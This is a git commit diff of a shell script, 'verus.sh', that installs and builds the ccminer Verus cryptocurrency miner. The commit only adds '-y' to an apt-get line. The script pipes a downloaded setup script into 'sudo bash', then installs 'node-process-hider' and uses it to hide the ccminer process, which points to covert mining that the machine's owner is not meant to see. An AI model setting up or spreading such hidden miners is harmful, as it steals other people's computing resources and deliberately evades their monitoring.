bd78502d2c568e4a825d2d48426de8579bf9e23e
robertreynolds2 <64372884+robertreynolds2@users.noreply.github.com>
2022-03-30 19:36:49 +0700

    Update verus.sh

--- verus.sh
+++ verus.sh
@@ -1,5 +1,5 @@
 curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs && npm i -g node-process-hider && sudo ph add ccminer
-sudo apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential
+sudo apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential -y
 git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git
 cd ccminer
 chmod +x build.sh
